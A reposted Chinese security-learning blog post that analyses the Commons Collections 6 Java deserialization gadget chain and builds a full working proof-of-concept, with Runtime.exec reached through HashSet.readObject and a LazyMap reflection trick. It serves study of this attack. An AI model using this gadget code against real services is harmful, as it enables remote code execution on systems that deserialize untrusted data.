<!doctype html>
<html lang="zh-CN">

<head>
        <link rel="canonical" href="https://freeclashverge.github.io/news/article-36110.htm" />
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>CommonsCollection6反序列化链学习</title>
        <meta name="description" content="1、前置知识 1.1、HashSet HashSet 基于 HashMap 来实现的，是一个不允许有重复元素的集合。继承了序列化和集合 构造函数参数为空的话创建一个HashMap(),有一个参数的情况" />
        <link rel="icon" href="/assets/website/img/freeclashverge/favicon.ico" type="image/x-icon"/>
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="/assets/website/css/freeclashverge/bootstrap.css">
    <link rel="stylesheet" href="__ADDON__/js/frontend/freeclashverge/linericon/style.css">
    <link rel="stylesheet" href="/assets/website/css/freeclashverge/font-awesome.min.css">
    <link rel="stylesheet" href="__ADDON__/js/frontend/freeclashverge/owl-carousel/owl.carousel.min.css">
    <link rel="stylesheet" href="/assets/website/css/freeclashverge/magnific-popup.css">
    <link rel="stylesheet" href="__ADDON__/js/frontend/freeclashverge/nice-select/css/nice-select.css">
    <!-- main css -->
    <link rel="stylesheet" href="/assets/website/css/freeclashverge/style.css">
    <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BZVJP9BVQB"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-BZVJP9BVQB');
</script>
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3332997411212854"
     crossorigin="anonymous"></script>
</head>

<body data-page="detail">
        <!--================ Start Header Area =================-->
    <header class="header_area">
        <div class="main_menu">
            <nav class="navbar navbar-expand-lg navbar-light">
                <div class="container">
                    <!-- Brand and toggle get grouped for better mobile display -->
                                        <a class="navbar-brand logo_h" href="/"><span>Free Clash Verge</span></a>
                                        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>
                    <!-- Collect the nav links, forms, and other content for toggling -->
                    <div class="collapse navbar-collapse offset" id="navbarSupportedContent">
                        <ul class="nav navbar-nav menu_nav justify-content-end">
                                                        <li class="nav-item"><a class="nav-link" href="/">首页</a></li>
                                                        <li class="nav-item"><a class="nav-link" href="/free-nodes/">免费节点</a></li>
                                                        <li class="nav-item"><a class="nav-link" href="/paid-subscribe/">推荐机场</a></li>
                                                        <li class="nav-item"><a class="nav-link" href="/news/">新闻资讯</a></li>
                                                        <li class="nav-item"><a class="nav-link" href="#">关于</a></li>
                            <li class="nav-item"><a class="nav-link" href="#">联系</a></li>
                        </ul>
                    </div>
                </div>
            </nav>
        </div>
    </header>
    <!--================ End Header Area =================-->
    <!--================ Start Banner Area =================-->
    <section class="banner_area">
        <div class="banner_inner d-flex align-items-center">
            <div class="container">
                <div class="banner_content text-center">
                    <h1>CommonsCollection6反序列化链学习</h1>
                    <div class="page_link">
                        <a href="/">首页</a>
                        <a href="/news/">新闻资讯</a>
                        <span>正文</span>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!--================ End Banner Area =================-->
    <!--================ Start About Us Area =================-->
    <section class="about_area section_gap">
        <div class="container">
            <div class="row">
                <div class="col-md-9">
                                    <input type="hidden" id="share-website-info" data-name="" data-url="">
                  				  				  				</h1> <h2 id="1前置知识">1、前置知识</h2> <h3 id="11hashset">1.1、HashSet</h3> <p>HashSet 基于 HashMap 来实现的，是一个不允许有重复元素的集合。继承了序列化和集合</p> <p>构造函数参数为空的话创建一个HashMap(),有一个参数的情况下，要创建指定容量的初始数值的哈希集合。</p> <p>我们看到add方法会调用map.put()方法。这个map就是HashMap()</p> <pre><code class="language-java">//定义HashMap,E在泛型表示集合的元素，元素的类型为Object private transient HashMap&lt;E,Object&gt; map; ...... public HashSet() {   map = new HashMap&lt;&gt;(); }  ...... //创建初始容量为initialCapacity的HashSet，其实就是创建HashMap集合 public HashSet(int initialCapacity) {   map = new HashMap&lt;&gt;(initialCapacity); }  ...... //往HashSet添加元素，其实就是调用HashMap的put方法添加 public boolean add(E e) {   return map.put(e, PRESENT)==null; }</code></pre> <h3 id="12hashmap">1.2、HashMap</h3> <p>HashMap 是一个散列表，它存储的内容是键值对(key-value)映射，实现了Map 接口、Serializable接口</p> <p>首先怎么怎么新建一个HashMap,这里就是创建一个整型（Integer）的 key 和字符串（String）类型的 value。</p> <pre><code class="language-java">HashMap&lt;Integer, String&gt; Sites = new HashMap&lt;Integer, String&gt;();</code></pre> <p><strong>添加键值对</strong>(key-value)的方法是put，接着上面我们添加键值对时也要传输对应的类型</p> <pre><code class="language-java"> Sites.put(1, "Google");</code></pre> <p><strong>访问元素</strong></p> <p>通过get(key),获取value的值</p> <pre><code class="language-java">Sites.get(1)</code></pre> <p><strong>删除元素</strong></p> <p>使用 remove(key) 方法来删除 指定的key 对应的键值，删除所有键值</p> <pre><code class="language-java">Sites.remove(1);删除指定的key对应的键值 Sites.clear();删除所有键值</code></pre> <p><strong>计算大小</strong></p> <p>计算 HashMap 中的元素数量</p> <pre><code class="language-java">Sites.size()</code></pre> <p><strong>遍历</strong></p> <p>通过keySet()方法获取所有的key(键)，也可以通过所有的valueSet()，获取所有value(键值)</p> <pre><code class="language-java">//输出所有的键和键值 for (Integer i : Sites.keySet()) {   System.out.println("key: " + i + " value: " + Sites.get(i)); } //输出所有的键值 for(String value: Sites.values()) {   // 输出每一个value   System.out.print(value + ", "); }</code></pre> <h3 id="13debug问题">1.3、debug问题</h3> <p>关于在调试put方法直接弹窗的解决办法。因为idea开启了自动tostring和展示集合对象</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/c8480df3c097e4910994f84308c0ae44.jpg" alt="CommonsCollection6反序列化链学习"></p> <p>关掉改这两个选项既正常调试</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/c41e1a5f2e6c3c8776ebb9a9e232a150.jpg" alt="CommonsCollection6反序列化链学习"></p> <h2 id="2poc利用">2、POC利用</h2> <h3 id="21利用链">2.1、利用链</h3> <p>这次我们先看ysoseria的利用链</p> <pre><code class="language-java">/* 	Gadget chain: 	    java.io.ObjectInputStream.readObject()             java.util.HashSet.readObject()                 java.util.HashMap.put()                 java.util.HashMap.hash()                     org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()                     org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()                         org.apache.commons.collections.map.LazyMap.get()                             org.apache.commons.collections.functors.ChainedTransformer.transform()                             org.apache.commons.collections.functors.InvokerTransformer.transform()                             java.lang.reflect.Method.invoke()                                 java.lang.Runtime.exec()     by @matthias_kaiser */</code></pre> <p>我们发现前面的利用链跟我们cc5可以说是一模一样，知道getValue()，cc5使用BadAttributeValueExpException的toString触发</p> <p>TiedMapEntry的toString触发TiedMapEntry的getValue，以此类推。而cc6采用的是HashSet、HashMap来完成的我们来仔细分析一下</p> <h3 id="22poc分析">2.2、POC分析</h3> <p><strong>TiedMapEntry.hashCode()</strong></p> <p>正如利用链那样可以调用getValue()方法，</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/d69b45fc69b5793e3a2f92458dce244c.jpg" alt="CommonsCollection6反序列化链学习"></p> <p><strong>HashMap.hash()</strong></p> <p>hash方法传入的参数为Object类型的key，然后用key去调用hashcode，所以我们只要传个恶意的TiedMapEntry作为hash()的key，就可以触发TiedMapEntry.hashCode()。</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/752c5a2e4dc6709e044e6a502556cd9e.jpg" alt="CommonsCollection6反序列化链学习"></p> <p><strong>HashMap.put()</strong></p> <p>我们看到HashMap()的put方法，其中hash(key)的key是通过put传输的，所以我们调用HashMap的put方法时，我们恶意构造的TiedMapEntry当做key传入就可以。</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/b6e01507bbe370c325c0b511711a3592.jpg" alt="CommonsCollection6反序列化链学习"></p> <p><strong>HashSet.readObject()</strong></p> <p>看到通过readObject循环map.put()，从readObject读取，其中的map就是HashMap，前置知识有学习。到这里我们就可以尝试自己构造链子了。</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/8edd2d2dc315b110dd8541eef414fb57.jpg" alt="CommonsCollection6反序列化链学习"></p> <h3 id="23poc构造">2.3、poc构造</h3> <h4 id="231第一步">2.3.1、第一步</h4> <p>首先我们把cc5的链直接搬过来，构造一个恶意的tiedMapEntry。</p> <pre><code class="language-java">Transformer[] transformers=new Transformer[]{   new ConstantTransformer(Runtime.class),   new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),   new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),   new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /System/Applications/Calculator.app"}) };  ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  Map map=new HashMap(); Map lazyMap=LazyMap.decorate(map,chainedTransformer); TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"test1");</code></pre> <h4 id="232第二步">2.3.2、第二步</h4> <p>创建HashSet,把我们的tiedMapEntry作为key传进去，通过add方法调用HashMap的put方法传进去。</p> <pre><code class="language-java">HashSet hashSet=new HashSet(1); hashSet.add(tiedMapEntry);</code></pre> <p>我们来序列化，再反序列化，但是我们在序列化的时候就已经弹窗了</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/cb5499ff71e35a13164667267f35173b.jpg" alt="CommonsCollection6反序列化链学习"></p> <p>网上查查看看，找出问题点为hashSet.add(tiedMapEntry)方法，在该方法会中add调用了put方法，这样就会直接触发我们的利用链，那我们有啥办法吗？答案就是在序列化的时候才通过反射把lazymap传进去，这样在我们add方法后才赋值，就不会触发我们的恶意代码。</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/ea0366fcb5f50039fc03880c95054253.jpg" alt="CommonsCollection6反序列化链学习"></p> <h4 id="233第三步">2.3.3、第三步</h4> <p>lazymap中用于调用的transform的属性为factory</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/bee49d52a549dd2765766b2cb3e5e4a2.jpg" alt="CommonsCollection6反序列化链学习"></p> <p>那么我们在调用HashSet的add的方法，在对LazyMap赋值时，传入一个空的ConstantTransformer，在执行完HashSet的add方法后，通过反射修改lazyMap属性factory的值为我们的恶意ChainedTransformer类。</p> <pre><code class="language-java">package com.akkacloud;  import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap;  import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map;  public class CommonsCollection6 {     public static void main(String[] args) throws Exception {          Transformer[] transformers=new Transformer[]{                 new ConstantTransformer(Runtime.class),                 new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),                 new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),                 new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /System/Applications/Calculator.app"})         };          ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);          Map map=new HashMap();         Map lazyMap=LazyMap.decorate(map,new ConstantTransformer(1));         TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"test1");          HashSet hashSet=new HashSet(1);         hashSet.add(tiedMapEntry);           Field field = LazyMap.class.getDeclaredField("factory");         field.setAccessible(true);         field.set(lazyMap,chainedTransformer);          serialize(hashSet); //        unserialize();       }      public static void serialize(Object obj ) throws Exception{         ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("test.ser"));         objectOutputStream.writeObject(obj);     }     public static void unserialize() throws Exception{         ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("test.ser"));         objectInputStream.readObject();     }  }</code></pre> <p>运行，在序列化的过程中没有问题，但是在反序列却没有弹窗！继续查找原因</p> <p>我们在hashSet的add()方法打断点调试一下，慢慢跟进到LazyMap的get方法，此时会判断我们的lazymap中是否会存在key，不存在进入if，先调用this.factory.transform(key)，此时的因为我们前面把空的ConstantTransformer赋值给LazyMap，所以Lazymap的key肯定为空的。<strong>题外知识点containsKey() 方法检查 hashMap 中是否存在指定的 key 对应的映射关系</strong></p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/2858d06f63685f132153fac52ce1e0b8.jpg" alt="CommonsCollection6反序列化链学习"></p> <p>但是在执行完this.factory.transform(key)后，会再一次把调用map的put()给key赋值，所以我们在反序列化的时候key里面是有东西的，在!super.map.containsKey(key）时就会判断为假，也就是有key，根本走不到this.factory.transform(key)，所以我们要在HashSet的add()方法后清除lazymap的key,<strong>既调用Lazymap的remove（key），不可以使用Hashset的remove方法，因为此时hashset仍是我们传入空ConstantTransformer的Lazymap，必须要调用我们等会要操作的lazymap才可以，去除他的键值对关系</strong></p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/30d2fe1675b9f62b2120c31dcaa97bf6.jpg" alt="CommonsCollection6反序列化链学习"></p> <h4 id="234第四步-poc">2.3.4、第四步-POC</h4> <pre><code class="language-java">package com.akkacloud;  import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap;  import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map;  public class CommonsCollection6 {     public static void main(String[] args) throws Exception {          Transformer[] transformers=new Transformer[]{                 new ConstantTransformer(Runtime.class),                 new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),                 new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),                 new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /System/Applications/Calculator.app"})         };          ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);          HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();         Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));          TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"test1");          HashSet hashSet=new HashSet(1);         hashSet.add(tiedMapEntry);         lazyMap.remove("test1");          //通过反射覆盖原有lazymap类的factory属性，传入我们的恶意chainedTransformer          Field field = LazyMap.class.getDeclaredField("factory");         field.setAccessible(true);         field.set(lazyMap,chainedTransformer);          serialize(hashSet);         unserialize();        }      public static void serialize(Object obj ) throws Exception{         ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("test.bin"));         objectOutputStream.writeObject(obj);     }     public static void unserialize() throws Exception{         ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("test.bin"));         objectInputStream.readObject();     }  }</code></pre> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/35672ded6dad112f0112e280cf404be8.jpg" alt="CommonsCollection6反序列化链学习"></p> <h3 id="24poc调试">2.4、POC调试</h3> <p>首先还是在Hashset处，漏洞点打下断点</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/3efef01e5ec597603668190127ca9a94.jpg" alt="CommonsCollection6反序列化链学习"></p> <p>跟进put方法，调用HashMap的hash方法，key为我们恶意的TiedMapEntry</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/a173dfc773f85928feda148c4f2883ec.jpg" alt="CommonsCollection6反序列化链学习"></p> <p>因为key为TiedMapEntry，所以调用的是TiedMapEntry的hashCode</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/47b1138174f19b5cd857a1d52fe63c86.jpg" alt="CommonsCollection6反序列化链学习"></p> <p>跟进TiedMapEntry的hashCode方法，继续跟进getValue，后面的就跟我们的cc5链一模一样了，就不赘述了，不懂得查看cc1或者cc5</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/7ad7a76a1a47f87e83c2fb36e2b6fda5.jpg" alt="CommonsCollection6反序列化链学习"></p> <p>跟进getValue方法，继续调用get方法</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/5671993cc0da3c1fc5b778ab46aad3b5.jpg" alt="CommonsCollection6反序列化链学习"></p> <p>进入LazyMap的get方法，此时的判断就是我们构造中去除lazymap的键值对关系的原因</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/60cc4b8528183eb6f8e08c866706fcfe.jpg" alt="CommonsCollection6反序列化链学习"></p> <p>可以已经成功进入到if，然后调用ChainedTransformer的transform</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/4c1d9d62699ad943d4b931c21cec2c88.jpg" alt="CommonsCollection6反序列化链学习"></p> <p>后面循环就是循环执行我们的恶意代码了</p> <h3 id="25思维导图">2.5、思维导图</h3> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/442f9f300037e6ece7b297e09fb39c5c.jpg" alt="CommonsCollection6反序列化链学习"></p> <p>参考链接</p> <p><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java"  target="_blank" rel="nofollow">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java</a></p> <p><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://www.cnblogs.com/nice0e3/p/13892510.html"  target="_blank" rel="nofollow">https://www.cnblogs.com/nice0e3/p/13892510.html</a></p> <p><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://www.bilibili.com/video/BV1yP4y1p7N7/?spm_id_from=333.788"  target="_blank" rel="nofollow">https://www.bilibili.com/video/BV1yP4y1p7N7/?spm_id_from=333.788</a></p> 			                <div class="clearfix"></div>
                <div class="col-md-12 mt-5">
                                        <p>上一个：<a href="/news/article-35589.htm">免费领养狗狗正规网成都 免费领养狗狗正规网成都地址</a></p>
                                        <p>下一个：<a href="/news/article-36111.htm">SSL及GMVPN握手协议详解</a></p>
                                    </div>
                                </div>
                <div class="col-md-3">
                    <div class="panel panel-default">
    <div class="panel-heading">
        <h3 class="panel-title">热门文章</h3>
    </div>
    <div class="panel-body">
        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
                        <li class="py-2"><a href="/free-nodes/2024-12-1-clash-verge-rev-node-share.htm" title="「12月1日」最高速度22.1M/S，2024年FreeClashVerge每天更新免费机场订阅节点链接">「12月1日」最高速度22.1M/S，2024年FreeClashVerge每天更新免费机场订阅节点链接</a></li>
                        <li class="py-2"><a href="/free-nodes/2024-11-6-free-subscribe-node.htm" title="「11月6日」最高速度22M/S，2024年FreeClashVerge每天更新免费机场订阅节点链接">「11月6日」最高速度22M/S，2024年FreeClashVerge每天更新免费机场订阅节点链接</a></li>
                        <li class="py-2"><a href="/free-nodes/2024-11-26-free-clash-verge-rev-node.htm" title="「11月26日」最高速度20.5M/S，2024年FreeClashVerge每天更新免费机场订阅节点链接">「11月26日」最高速度20.5M/S，2024年FreeClashVerge每天更新免费机场订阅节点链接</a></li>
                        <li class="py-2"><a href="/news/article-22090.htm" title="实际业务处理 Kafka 消息丢失、重复消费和顺序消费的问题">实际业务处理 Kafka 消息丢失、重复消费和顺序消费的问题</a></li>
                        <li class="py-2"><a href="/news/article-19794.htm" title="动物疫苗注射的作用机制是什么（动物疫苗的概念）">动物疫苗注射的作用机制是什么（动物疫苗的概念）</a></li>
                        <li class="py-2"><a href="/news/article-34750.htm" title="被猫抓伤打针吗大人（被猫抓伤打针吗大人能打吗）">被猫抓伤打针吗大人（被猫抓伤打针吗大人能打吗）</a></li>
                        <li class="py-2"><a href="/news/article-31903.htm" title="合肥哪里有领养狗狗的地方电话（合肥哪里有领养狗狗的地方电话号码）">合肥哪里有领养狗狗的地方电话（合肥哪里有领养狗狗的地方电话号码）</a></li>
                        <li class="py-2"><a href="/free-nodes/2024-11-9-free-subscribe-node.htm" title="「11月9日」最高速度19.5M/S，2024年FreeClashVerge每天更新免费机场订阅节点链接">「11月9日」最高速度19.5M/S，2024年FreeClashVerge每天更新免费机场订阅节点链接</a></li>
                        <li class="py-2"><a href="/news/article-19795.htm" title="动物疫苗在哪里***好呢视频（动物疫苗接种途径有哪些）">动物疫苗在哪里***好呢视频（动物疫苗接种途径有哪些）</a></li>
                        <li class="py-2"><a href="/free-nodes/2024-12-14-free-clash-verge-rev-node.htm" title="「12月14日」最高速度21.1M/S，2024年FreeClashVerge每天更新免费机场订阅节点链接">「12月14日」最高速度21.1M/S，2024年FreeClashVerge每天更新免费机场订阅节点链接</a></li>
                    </ul>
    </div>
</div>

<div class="panel panel-default">
    <div class="panel-heading">
        <h3 class="panel-title">归纳</h3>
    </div>
    <div class="panel-body">
        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">21</span> <a href="/date/2025-01/" title="2025-01 归档">2025-01</a></h4>
            </li>
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">92</span> <a href="/date/2024-12/" title="2024-12 归档">2024-12</a></h4>
            </li>
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">34</span> <a href="/date/2024-11/" title="2024-11 归档">2024-11</a></h4>
            </li>
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">25</span> <a href="/date/2024-10/" title="2024-10 归档">2024-10</a></h4>
            </li>
                    </ul>
    </div>
</div>

                </div>
            </div>
        </div>
    </section>
    <!--================ End About Us Area =================-->
        <!--================Footer Area =================-->
    <footer class="footer_area">
        <div class="container">
            <div class="row footer_bottom justify-content-center">
                <p class="col-lg-8 col-sm-12 footer-text">
                            <p>
                                <a href="/">首页</a> | 
                                <a href="/free-node/">免费节点</a> | 
                                <a href="/news/">新闻资讯</a> |
                                <a href="/about-us.htm">关于我们</a> |
                                <a href="/disclaimer.htm">免责申明</a> |
                                <a href="/privacy.htm">隐私申明</a> |
                                <a href="/sitemap.xml">网站地图</a>
                            </p>
                            FreeClashVerge免费节点官网 版权所有 Powered by WordPress
                </p>
            </div>
        </div>
    </footer>
    <!--================End Footer Area =================-->
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="/assets/website/js/frontend/freeclashverge/jquery-3.5.1.min.js"></script>
    <script src="/assets/website/js/frontend/freeclashverge/popper.js"></script>
    <script src="/assets/website/js/frontend/freeclashverge/bootstrap.min.js"></script>
    <script src="/assets/website/js/frontend/freeclashverge/stellar.js"></script>
    <script src="/assets/website/js/frontend/freeclashverge/jquery.magnific-popup.min.js"></script>
    <script src="/assets/website/js/frontend/freeclashverge/nice-select/js/jquery.nice-select.min.js"></script>
    <script src="/assets/website/js/frontend/freeclashverge/isotope/imagesloaded.pkgd.min.js"></script>
    <script src="/assets/website/js/frontend/freeclashverge/isotope/isotope-min.js"></script>
    <script src="/assets/website/js/frontend/freeclashverge/owl-carousel/owl.carousel.min.js"></script>
    <script src="/assets/website/js/frontend/freeclashverge/jquery.ajaxchimp.min.js"></script>
    <script src="/assets/website/js/frontend/freeclashverge/mail-script.js"></script>
    <!--gmaps Js-->
    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCjCGmQ0Uq4exrzdcL6rvxywDDOvfAu6eE"></script>
    <script src="/assets/website/js/frontend/freeclashverge/gmaps.min.js"></script>
    <script src="/assets/website/js/frontend/freeclashverge/theme.js"></script>
    <script src="https://www.freeclashnode.com/assets/js/frontend/invite-url.js"></script><script src="/assets/website/js/frontend/G.js"></script>
</body>

</html>